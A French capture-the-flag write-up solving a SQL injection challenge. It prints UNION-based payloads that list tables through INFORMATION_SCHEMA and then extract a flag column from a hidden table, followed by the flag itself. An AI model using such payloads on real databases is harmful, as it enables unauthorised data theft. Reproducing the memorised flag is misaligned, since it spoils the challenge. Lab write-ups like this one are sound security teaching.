# Writeup - Injection SQL #1: Va me falloir un SCHEMA

Comme pour le challenge précédent, on peut voir la requête utilisée:

```sql
SELECT * FROM challenge1 WHERE id='NOTRE_INPUT';
```

En essayant la même passe-passe que pour le défi précédent, on obtient bel et bien le contenu complet de la table `challenge1`, mais celle-ci ne contient pas de flag.

La description du challenge parle d'`UNION` et de `INFORMATION_SCHEMA`. Cette dernière contient les métadonnées de la BD, incluant le nom des tables et de leurs colonne. En lisant celle-ci, on peut tenter de voir si il existe une autre table nous semble intéressante.

```sql
 -- Notre entrée
' UNION SELECT 1,table_name,column_name,2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema') --

 -- Requête complète
SELECT * FROM challenge1 WHERE id='' UNION SELECT 1,table_name,column_name,2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema') -- ';
```

Exclure les tables dont le schema est `information_schema`, `mysql` ou `performance_schema` permet de voir seulement les tables crées par un utilisateur. Ceci n'est pas nécessaire, mais réduit grandement la taille des résultats en enlevant des tables qui ne nous intéressent pas.

Cette requête nous permet de découvrir qu'il existe la table `secret_table_XaFqEhxVY3U` qui contient les colonnes id, filler, junk et flag. Cette dernière nous semble être la plus intéressante. On peut donc répéter la requête précédente en changeant le nom de la table et des colonnes:

```sql
 -- Notre entrée
' UNION SELECT 1,filler,junk,flag FROM secret_table_XaFqEhxVY3U --
 -- Requête complète
SELECT * FROM challenge1 WHERE id='' UNION SELECT 1,filler,junk,flag FROM secret_table_XaFqEhxVY3U -- ';
```

Et le flag nous apparait: **FLAG-And_in_the_db_UNION_them_l88VnAUrYEI**
